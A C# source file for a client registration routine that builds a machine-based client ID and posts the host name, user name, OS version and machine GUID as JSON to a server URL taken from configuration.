using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using Newtonsoft.Json;
using True.Core;
using True.Helper;

namespace True.Features
{
    public static class ClientRegistrar
    {
        public static async Task<bool> RegisterAsync()
        {
            try
            {
                // Before reading values
                ConfigManager.EnsureConfigExists(); // Creates + Loads

                string clientId = ConfigManager.Get("General", "client_id");
                if (string.IsNullOrWhiteSpace(clientId))
                {
                    clientId = $"client-{MiscHelper.GetMachineGuid()}";
                    ConfigManager.Set("General", "client_id", clientId);
                    ConfigManager.Save();

                }

                string serverUrl = ConfigManager.Get("General", "server_url") + "backend/api/client_register.php";
                string hostname = Environment.MachineName;
                string username = Environment.UserName;
                string osVersion = MiscHelper.GetFriendlyOSName();
                string machineGuid = MiscHelper.GetMachineGuid();
                string ip = await NetworkHelper.GetPublicIP(); 

                var data = new
                {
                    client_id = clientId,
                    hostname,
                    username,
                    os_version = osVersion,
                    machine_guid = machineGuid,
                    last_seen = DateTime.UtcNow.ToString("o") // ISO format
                };

                string json = JsonConvert.SerializeObject(data);

                using var client = new HttpClient();
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await client.PostAsync(serverUrl, content);
                var result = await response.Content.ReadAsStringAsync();

                if (!response.IsSuccessStatusCode)
                {
                    Logger.Error("ClientRegistrar", $"Registration failed: {response.StatusCode} - {result}");
                    return false;
                }

                Logger.Info("ClientRegistrar", $"Registered client. Server says: {result}");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Error("ClientRegistrar", $"Registration failed: {ex.Message}");
                return false;
            }
        }

        

        

    }
}
